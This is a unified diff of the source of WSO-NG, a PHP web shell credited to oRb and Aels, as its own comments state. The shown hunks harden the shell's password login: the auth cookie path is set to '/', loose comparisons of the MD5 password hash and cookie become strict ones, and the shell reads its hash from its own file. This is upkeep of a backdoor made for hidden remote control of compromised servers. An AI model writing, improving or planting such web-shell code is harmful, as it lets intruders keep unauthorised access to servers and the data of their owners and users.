@@ -1,6 +1,6 @@
 <?php
 
-// https://github.com/aels/wso-ng/blob/main/wso-ng.php
+// https://github.com/aels/wso-ng/
 // by oRb, rework by Aels
 
 preg_match('/.*pass *= ?"?([a-f0-9]{32}).*/si', @file_get_contents($_SERVER['SCRIPT_FILENAME']), $matches);
@@ -60,7 +60,7 @@ try {
 	}
 	function WSOsetcookie($k, $v) {
 		$_COOKIE[$k] = $v;
-		setcookie($k, $v);
+		setcookie($k, $v, 0, '/');
 	}
 	function wsoBreadCrumps() {
 		$cwd_links = '';
@@ -191,8 +191,8 @@ try {
 	}
 
 	if (!empty($auth_pass)) {
-		if (isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass)) WSOsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
-		if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) ]) || ($_COOKIE[md5($_SERVER['HTTP_HOST']) ] != $auth_pass)) wsoLogin();
+		if (isset($_POST['pass']) && (md5($_POST['pass']) === $auth_pass)) WSOsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
+		if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] !== $auth_pass)) wsoLogin();
 	}
 
 	$os = (strtolower(substr(PHP_OS, 0, 3)) == "win")?'win':'nix';
